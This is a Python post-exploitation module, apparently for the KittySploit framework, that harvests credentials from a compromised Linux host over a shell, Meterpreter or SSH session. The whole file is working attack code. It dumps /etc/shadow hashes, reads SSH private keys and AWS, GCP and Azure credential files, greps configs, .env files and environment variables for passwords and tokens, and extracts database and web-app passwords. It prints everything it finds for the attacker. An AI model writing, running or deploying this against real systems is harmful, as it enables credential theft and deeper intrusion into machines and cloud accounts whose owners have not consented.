from kittysploit import *
from lib.post.linux.system import System
import re

class Module(Post, System):

    __info__ = {
        "name": "Linux Credentials Gathering",
        "description": "Gather credentials including password hashes, SSH keys, API tokens, and passwords in configuration files",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, 
                        SessionType.METERPRETER,
                        SessionType.SSH],
    }

    def run(self):
        """Gather credentials from various sources"""
        
        print_status("Starting credentials gathering...")
        
        # 1. Password Hashes
        self._gather_password_hashes()
        
        # 2. SSH Keys
        self._gather_ssh_keys()
        
        # 3. API Tokens
        self._gather_api_tokens()
        
        # 4. Passwords in Config Files
        self._gather_config_passwords()
        
        # 5. Environment Variables
        self._gather_env_variables()
        
        # 6. Credential Files
        self._gather_credential_files()
        
        # 7. Database Credentials
        self._gather_database_credentials()
        
        # 8. Web Application Credentials
        self._gather_web_credentials()
        
        print_success("Credentials gathering completed")
        return True
    
    def _gather_password_hashes(self):
        """Gather password hashes from /etc/shadow"""
        print_status("="*60)
        print_status("Password Hashes")
        print_status("="*60)
        
        try:
            # Try to read /etc/shadow
            shadow_content = self.read_file("/etc/shadow")
            if shadow_content and "Permission denied" not in shadow_content and "No such file" not in shadow_content:
                print_warning("Successfully accessed /etc/shadow!")
                print_info("Extracting password hashes...")
                
                hashes_found = []
                for line in shadow_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 2:
                            username = parts[0]
                            hash_field = parts[1]
                            
                            if hash_field and hash_field not in ['*', '!', '!!']:
                                # Determine hash type
                                hash_type = "unknown"
                                if hash_field.startswith('$1$'):
                                    hash_type = "MD5"
                                elif hash_field.startswith('$2a$') or hash_field.startswith('$2b$'):
                                    hash_type = "Blowfish"
                                elif hash_field.startswith('$5$'):
                                    hash_type = "SHA-256"
                                elif hash_field.startswith('$6$'):
                                    hash_type = "SHA-512"
                                elif hash_field.startswith('$y$') or hash_field.startswith('$2y$'):
                                    hash_type = "bcrypt"
                                
                                hashes_found.append({
                                    'username': username,
                                    'hash': hash_field,
                                    'type': hash_type
                                })
                                
                                print_info(f"  {username}: {hash_field} (Type: {hash_type})")
                
                if hashes_found:
                    print_success(f"Found {len(hashes_found)} password hash(es)")
                else:
                    print_info("No password hashes found (all accounts locked or use other auth)")
            else:
                print_warning("Cannot read /etc/shadow (requires root privileges)")
            
            # Try to get hashes from /etc/passwd (old systems)
            passwd_content = self.read_file("/etc/passwd")
            if passwd_content:
                for line in passwd_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 2 and parts[1] and parts[1] not in ['x', '*']:
                            print_warning(f"Found password hash in /etc/passwd for {parts[0]}: {parts[1]}")
                            
        except Exception as e:
            print_warning(f"Error gathering password hashes: {e}")
    
    def _gather_ssh_keys(self):
        """Gather SSH private and public keys"""
        print_status("="*60)
        print_status("SSH Keys")
        print_status("="*60)
        
        try:
            # Find SSH private keys
            print_status("Searching for SSH private keys...")
            private_key_patterns = [
                "id_rsa",
                "id_dsa",
                "id_ecdsa",
                "id_ed25519",
                "id_ecdsa_sk",
                "id_ed25519_sk",
                "*_rsa",
                "*_dsa",
                "*_key",
                "*.pem"
            ]
            
            ssh_keys_found = []
            for pattern in private_key_patterns:
                find_cmd = f"find /home /root /opt /tmp -name '{pattern}' -type f 2>/dev/null | head -50"
                keys = self.cmd_exec(find_cmd)
                if keys:
                    for key_file in keys.strip().split('\n'):
                        if key_file.strip() and key_file not in ssh_keys_found:
                            ssh_keys_found.append(key_file)
                            
                            # Check if it's actually a private key
                            key_content = self.read_file(key_file)
                            if key_content:
                                if "BEGIN" in key_content and ("PRIVATE KEY" in key_content or "RSA PRIVATE KEY" in key_content):
                                    print_warning(f"Found private key: {key_file}")
                                    
                                    # Get file permissions
                                    perms = self.cmd_exec(f"ls -l {key_file} 2>/dev/null")
                                    if perms:
                                        print_info(f"  Permissions: {perms.strip()}")
                                    
                                    # Show first few lines
                                    lines = key_content.strip().split('\n')[:3]
                                    for line in lines:
                                        if line.strip():
                                            print_info(f"  {line}")
            
            # Find SSH public keys
            print_status("Searching for SSH public keys...")
            public_keys = self.cmd_exec("find /home /root -name '*.pub' -type f 2>/dev/null | head -30")
            if public_keys:
                for pub_key in public_keys.strip().split('\n'):
                    if pub_key.strip():
                        print_info(f"Found public key: {pub_key}")
                        key_content = self.read_file(pub_key)
                        if key_content:
                            print_info(f"  {key_content.strip()}")
            
            # Check known_hosts for interesting entries
            known_hosts = self.read_file("~/.ssh/known_hosts")
            if not known_hosts:
                known_hosts = self.cmd_exec("find /home /root -name 'known_hosts' 2>/dev/null | head -5")
                if known_hosts:
                    for kh_file in known_hosts.strip().split('\n'):
                        if kh_file.strip():
                            kh_content = self.read_file(kh_file)
                            if kh_content:
                                print_status(f"Known hosts from {kh_file}:")
                                for line in kh_content.strip().split('\n')[:10]:
                                    if line.strip():
                                        print_info(f"  {line}")
                                
        except Exception as e:
            print_warning(f"Error gathering SSH keys: {e}")
    
    def _gather_api_tokens(self):
        """Gather API tokens and keys"""
        print_status("="*60)
        print_status("API Tokens and Keys")
        print_status("="*60)
        
        try:
            # AWS credentials
            print_status("AWS Credentials:")
            aws_creds_file = "~/.aws/credentials"
            aws_creds = self.read_file(aws_creds_file)
            if not aws_creds:
                aws_creds = self.read_file("/root/.aws/credentials")
            if aws_creds:
                print_warning("Found AWS credentials file!")
                for line in aws_creds.strip().split('\n'):
                    if line.strip() and ('=' in line or '[' in line):
                        print_warning(f"  {line}")
            
            # AWS config
            aws_config = self.read_file("~/.aws/config")
            if not aws_config:
                aws_config = self.read_file("/root/.aws/config")
            if aws_config:
                print_info("AWS config found")
            
            # GCP credentials
            print_status("GCP Credentials:")
            gcp_creds = self.cmd_exec("find /home /root -name '*gcp*' -o -name '*google*' -type f 2>/dev/null | grep -i credential | head -10")
            if gcp_creds:
                for cred_file in gcp_creds.strip().split('\n'):
                    if cred_file.strip():
                        print_warning(f"Found GCP credential file: {cred_file}")
                        content = self.read_file(cred_file)
                        if content:
                            # Look for JSON keys
                            if '"private_key"' in content or '"client_email"' in content:
                                print_warning("  Contains GCP service account key!")
            
            # Azure credentials
            print_status("Azure Credentials:")
            azure_creds = self.read_file("~/.azure/azureProfile.json")
            if not azure_creds:
                azure_creds = self.read_file("/root/.azure/azureProfile.json")
            if azure_creds:
                print_warning("Found Azure profile!")
            
            # Generic API keys in common locations
            print_status("Searching for API keys in common locations...")
            api_key_patterns = [
                ("~/.config", "config files"),
                ("~/.local/share", "local share"),
                ("/opt", "opt directory"),
                ("/etc", "etc directory")
            ]
            
            # Search for common API key patterns
            api_key_files = self.cmd_exec("find /home /root -type f -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.conf' 2>/dev/null | head -50")
            if api_key_files:
                for file_path in api_key_files.strip().split('\n'):
                    if file_path.strip():
                        content = self.read_file(file_path)
                        if content:
                            # Look for API key patterns
                            if re.search(r'(api[_-]?key|apikey|access[_-]?token|secret[_-]?key|auth[_-]?token)', content, re.IGNORECASE):
                                print_warning(f"Potential API key file: {file_path}")
                                # Extract potential keys
                                matches = re.findall(r'(api[_-]?key|apikey|access[_-]?token|secret[_-]?key)\s*[:=]\s*([^\s\n\'\"<>]+)', content, re.IGNORECASE)
                                for match in matches[:3]:  # Limit to 3 matches
                                    print_info(f"  {match[0]}: {match[1]}")
                                
        except Exception as e:
            print_warning(f"Error gathering API tokens: {e}")
    
    def _gather_config_passwords(self):
        """Gather passwords from configuration files"""
        print_status("="*60)
        print_status("Passwords in Configuration Files")
        print_status("="*60)
        
        try:
            # Common config files that might contain passwords
            config_files = [
                "/etc/mysql/my.cnf",
                "/etc/mysql/debian.cnf",
                "/root/.my.cnf",
                "~/.my.cnf",
                "/etc/postgresql/*/pg_hba.conf",
                "/etc/postgresql/*/postgresql.conf",
                "/etc/apache2/apache2.conf",
                "/etc/nginx/nginx.conf",
                "/etc/samba/smb.conf",
                "/etc/vsftpd.conf",
                "/etc/proftpd/proftpd.conf",
                "/etc/pure-ftpd/pure-ftpd.conf",
                "/etc/ssh/sshd_config",
                "/etc/redis/redis.conf",
                "/etc/mongodb.conf",
                "/opt/lampp/etc/httpd.conf"
            ]
            
            password_patterns = [
                r'password\s*[:=]\s*([^\s\n\'\"<>]+)',
                r'passwd\s*[:=]\s*([^\s\n\'\"<>]+)',
                r'pass\s*[:=]\s*([^\s\n\'\"<>]+)',
                r'pwd\s*[:=]\s*([^\s\n\'\"<>]+)',
                r'secret\s*[:=]\s*([^\s\n\'\"<>]+)',
            ]
            
            found_passwords = []
            
            for config_pattern in config_files:
                # Expand wildcards
                if '*' in config_pattern:
                    files = self.cmd_exec(f"ls {config_pattern} 2>/dev/null")
                    if files:
                        for file_path in files.strip().split('\n'):
                            if file_path.strip():
                                self._search_passwords_in_file(file_path, password_patterns, found_passwords)
                else:
                    # Expand ~
                    file_path = config_pattern.replace('~', '/root')
                    if self.file_exist(file_path):
                        self._search_passwords_in_file(file_path, password_patterns, found_passwords)
                    else:
                        # Try with home directory
                        home = self.cmd_exec("echo $HOME 2>/dev/null").strip()
                        if home:
                            file_path = config_pattern.replace('~', home)
                            if self.file_exist(file_path):
                                self._search_passwords_in_file(file_path, password_patterns, found_passwords)
            
            if found_passwords:
                print_success(f"Found passwords in {len(found_passwords)} file(s)")
            else:
                print_info("No passwords found in common configuration files")
                
        except Exception as e:
            print_warning(f"Error gathering config passwords: {e}")
    
    def _search_passwords_in_file(self, file_path, patterns, found_list):
        """Search for passwords in a file"""
        try:
            content = self.read_file(file_path)
            if content:
                for pattern in patterns:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        password = match.group(1)
                        # Filter out common false positives
                        if password not in ['', 'yes', 'no', 'true', 'false', 'null', 'none'] and len(password) > 3:
                            if file_path not in found_list:
                                found_list.append(file_path)
                                print_warning(f"Found password in {file_path}:")
                                # Show context
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if match.group(0) in line:
                                        print_info(f"  Line {i+1}: {line}")
                                        break
        except Exception:
            pass
    
    def _gather_env_variables(self):
        """Gather sensitive environment variables"""
        print_status("="*60)
        print_status("Environment Variables")
        print_status("="*60)
        
        try:
            # Get all environment variables
            env_vars = self.cmd_exec("env 2>/dev/null")
            if env_vars:
                print_info("Current environment variables:")
                
                sensitive_keywords = ['pass', 'secret', 'key', 'token', 'auth', 'credential', 'api']
                found_sensitive = False
                
                for line in env_vars.strip().split('\n'):
                    if line.strip() and '=' in line:
                        var_name = line.split('=')[0].upper()
                        var_value = '='.join(line.split('=')[1:])
                        
                        # Check if it's a sensitive variable
                        is_sensitive = any(keyword in var_name.lower() for keyword in sensitive_keywords)
                        
                        if is_sensitive:
                            found_sensitive = True
                            print_warning(f"  {line}")
                        else:
                            print_info(f"  {line[:100]}")
                
                if not found_sensitive:
                    print_info("No obviously sensitive environment variables found")
            
            # Check for .env files
            print_status("Searching for .env files...")
            env_files = self.cmd_exec("find /home /root /opt /var/www -name '.env' -type f 2>/dev/null | head -20")
            if env_files:
                for env_file in env_files.strip().split('\n'):
                    if env_file.strip():
                        print_warning(f"Found .env file: {env_file}")
                        content = self.read_file(env_file)
                        if content:
                            # Look for sensitive variables
                            for line in content.strip().split('\n'):
                                if line.strip() and '=' in line and not line.strip().startswith('#'):
                                    var_name = line.split('=')[0].upper()
                                    if any(keyword in var_name.lower() for keyword in sensitive_keywords):
                                        print_warning(f"  {line}")
                                    else:
                                        print_info(f"  {line[:80]}")
                                
        except Exception as e:
            print_warning(f"Error gathering environment variables: {e}")
    
    def _gather_credential_files(self):
        """Gather credential files"""
        print_status("="*60)
        print_status("Credential Files")
        print_status("="*60)
        
        try:
            # Search for common credential file names
            credential_patterns = [
                "*credentials*",
                "*credential*",
                "*password*",
                "*passwd*",
                "*.pwd",
                "*.key",
                "*.pem",
                "*secret*",
                "*token*",
                "*auth*"
            ]
            
            found_files = []
            for pattern in credential_patterns:
                files = self.cmd_exec(f"find /home /root /opt /tmp -iname '{pattern}' -type f 2>/dev/null | head -30")
                if files:
                    for file_path in files.strip().split('\n'):
                        if file_path.strip() and file_path not in found_files:
                            found_files.append(file_path)
                            print_warning(f"Found credential file: {file_path}")
                            
                            # Check file size
                            size = self.cmd_exec(f"wc -c < {file_path} 2>/dev/null").strip()
                            if size and size.isdigit():
                                size_kb = int(size) / 1024
                                print_info(f"  Size: {size_kb:.2f} KB")
                            
                            # Show first few lines if it's a text file
                            if int(size) < 10000:  # Only for small files
                                content = self.read_file(file_path)
                                if content and not content.startswith('\x00'):  # Not binary
                                    lines = content.strip().split('\n')[:5]
                                    for line in lines:
                                        if line.strip():
                                            print_info(f"  {line[:100]}")
                                
        except Exception as e:
            print_warning(f"Error gathering credential files: {e}")
    
    def _gather_database_credentials(self):
        """Gather database credentials"""
        print_status("="*60)
        print_status("Database Credentials")
        print_status("="*60)
        
        try:
            # MySQL credentials
            mysql_files = [
                "/root/.my.cnf",
                "~/.my.cnf",
                "/etc/mysql/my.cnf",
                "/etc/my.cnf"
            ]
            
            for mysql_file in mysql_files:
                file_path = mysql_file.replace('~', '/root')
                if self.file_exist(file_path):
                    print_warning(f"Found MySQL config: {file_path}")
                    content = self.read_file(file_path)
                    if content:
                        for line in content.strip().split('\n'):
                            if 'password' in line.lower() or 'user' in line.lower():
                                print_info(f"  {line}")
            
            # PostgreSQL credentials
            pg_files = self.cmd_exec("find /home /root -name '.pgpass' -o -name 'pgpass.conf' 2>/dev/null")
            if pg_files:
                for pg_file in pg_files.strip().split('\n'):
                    if pg_file.strip():
                        print_warning(f"Found PostgreSQL password file: {pg_file}")
                        content = self.read_file(pg_file)
                        if content:
                            # .pgpass format: hostname:port:database:username:password
                            for line in content.strip().split('\n'):
                                if line.strip() and not line.strip().startswith('#'):
                                    print_info(f"  {line}")
            
            # MongoDB credentials
            mongodb_files = self.cmd_exec("find /home /root -name '.mongorc.js' -o -name 'mongodb.conf' 2>/dev/null")
            if mongodb_files:
                for mongo_file in mongodb_files.strip().split('\n'):
                    if mongo_file.strip():
                        print_warning(f"Found MongoDB config: {mongo_file}")
            
            # Redis credentials
            redis_conf = self.read_file("/etc/redis/redis.conf")
            if redis_conf:
                if 'requirepass' in redis_conf.lower():
                    print_warning("Found Redis password configuration in /etc/redis/redis.conf")
                    for line in redis_conf.strip().split('\n'):
                        if 'requirepass' in line.lower() and not line.strip().startswith('#'):
                            print_info(f"  {line}")
                                
        except Exception as e:
            print_warning(f"Error gathering database credentials: {e}")
    
    def _gather_web_credentials(self):
        """Gather web application credentials"""
        print_status("="*60)
        print_status("Web Application Credentials")
        print_status("="*60)
        
        try:
            # Common web app config locations
            web_dirs = [
                "/var/www",
                "/opt/lampp/htdocs",
                "/usr/share/nginx/html",
                "/srv/www",
                "/home/*/public_html",
                "/home/*/www"
            ]
            
            config_patterns = [
                "wp-config.php",
                "config.php",
                "configuration.php",
                "settings.php",
                "config.inc.php",
                ".env",
                "config.json",
                "config.yaml"
            ]
            
            found_configs = []
            for web_dir in web_dirs:
                for pattern in config_patterns:
                    find_cmd = f"find {web_dir} -name '{pattern}' -type f 2>/dev/null | head -20"
                    files = self.cmd_exec(find_cmd)
                    if files:
                        for file_path in files.strip().split('\n'):
                            if file_path.strip() and file_path not in found_configs:
                                found_configs.append(file_path)
                                print_warning(f"Found web config: {file_path}")
                                
                                content = self.read_file(file_path)
                                if content:
                                    # Look for database credentials
                                    db_patterns = [
                                        r'DB_PASSWORD\s*[:=]\s*[\'"]?([^\'"\s]+)',
                                        r'DB_PASS\s*[:=]\s*[\'"]?([^\'"\s]+)',
                                        r'password\s*[:=]\s*[\'"]?([^\'"\s]+)',
                                        r'pwd\s*[:=]\s*[\'"]?([^\'"\s]+)',
                                    ]
                                    
                                    for db_pattern in db_patterns:
                                        matches = re.finditer(db_pattern, content, re.IGNORECASE)
                                        for match in matches:
                                            print_info(f"  {match.group(0)}")
                                
        except Exception as e:
            print_warning(f"Error gathering web credentials: {e}")

